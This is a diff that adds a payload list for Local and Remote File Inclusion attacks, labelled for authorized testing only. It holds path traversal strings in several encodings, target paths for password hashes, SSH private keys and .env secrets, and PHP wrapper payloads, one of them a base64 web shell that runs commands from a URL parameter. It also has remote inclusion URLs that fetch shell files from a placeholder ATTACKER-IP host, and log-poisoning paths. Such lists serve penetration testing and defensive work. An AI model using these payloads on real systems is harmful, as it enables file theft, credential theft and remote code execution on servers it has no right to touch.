@@ -1,0 +1,93 @@
+# Local / Remote File Inclusion (LFI/RFI) Payloads
+# For authorized security testing only
+
+# ─── BASIC PATH TRAVERSAL ─────────────────────────────────────────
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+
+# ─── WITH NULL BYTE ───────────────────────────────────────────────
+../../../etc/passwd%00
+../../../etc/passwd%00.jpg
+../../../etc/passwd%00.php
+../../etc/passwd%2500
+
+# ─── URL ENCODED ──────────────────────────────────────────────────
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e/%2e%2e/%2e%2e/etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+..%252f..%252f..%252fetc%252fpasswd
+
+# ─── DOUBLE ENCODED ───────────────────────────────────────────────
+%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+..%255c..%255c..%255cwindows%255cwin.ini
+
+# ─── WINDOWS TARGETS ──────────────────────────────────────────────
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+../../../../windows/win.ini
+../../../../boot.ini
+../../../../windows/system32/drivers/etc/hosts
+C:\windows\win.ini
+C:\boot.ini
+
+# ─── LINUX SENSITIVE FILES ────────────────────────────────────────
+/etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/hostname
+/etc/issue
+/etc/motd
+/etc/resolv.conf
+/etc/fstab
+/proc/self/environ
+/proc/self/cmdline
+/proc/self/fd/0
+/proc/self/fd/1
+/proc/version
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+/var/log/nginx/access.log
+/var/log/auth.log
+/var/log/mail.log
+/root/.bash_history
+/root/.ssh/id_rsa
+/home/user/.bash_history
+/home/user/.ssh/id_rsa
+/var/www/html/config.php
+/var/www/html/.env
+/usr/local/etc/php/php.ini
+/etc/php/7.4/apache2/php.ini
+
+# ─── PHP WRAPPER INJECTION ────────────────────────────────────────
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.base64-encode/resource=../config.php
+php://input
+php://stdin
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
+expect://id
+phar://./uploaded.jpg/shell.php
+
+# ─── RFI PAYLOADS ─────────────────────────────────────────────────
+# Replace ATTACKER-IP with your server
+http://ATTACKER-IP/shell.txt
+http://ATTACKER-IP/shell.txt%00
+http://ATTACKER-IP/shell.txt?
+https://ATTACKER-IP/shell.php
+\\ATTACKER-IP\share\shell.php
+
+# ─── LOG POISONING PATHS ──────────────────────────────────────────
+/var/log/apache2/access.log
+/var/log/apache/access.log
+/var/log/httpd/access_log
+/var/log/nginx/access.log
+/var/log/vsftpd.log
+/var/log/sshd.log
+/proc/self/fd/2
